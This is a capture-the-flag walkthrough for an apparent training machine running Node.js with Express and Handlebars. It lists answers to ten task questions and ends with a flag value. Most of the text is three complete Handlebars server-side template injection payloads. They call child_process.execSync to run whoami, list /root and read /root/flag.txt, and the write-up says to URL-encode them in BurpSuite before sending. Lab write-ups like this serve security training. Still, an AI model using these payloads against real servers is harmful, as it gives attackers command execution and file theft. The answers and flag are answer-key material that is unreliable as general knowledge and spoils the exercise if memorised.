Task 1 - What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.
"22,80"

Task 2 - What software is running the service listening on the http/web port identified in the first question?
"Node.JS"

Task 3 - What is the name of the Web Framework according to Wappalyzer?
"Express"

Task 4 - What is the name of the vulnerability we test for by submitting {{7*7}}?
"Server Side Template Injection"

Task 5 - What is the templating engine being used within Node.JS?
"handlebars"

Task 6 - What is the name of the BurpSuite tab used to encode text?
"Decoder"

Task 7 - In order to send special characters in out payload in an HTTP request, we'll encode the payload. What type of encoding do we use?
"URL"

Task 8 - When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?
"require"

Task 9 - What variable is the name of the top-level scope in Node.JS?
"global"

Task 10 - By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
"root"

Submit Flag
Encode Handlebars Node.JS injection with URL in BurpSuite and then input into BurpSuite packet

WHOAMI
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}


LS /ROOT

{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}

CAT FLAG

{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}


6b258d726d287462d60c103d0142a81c
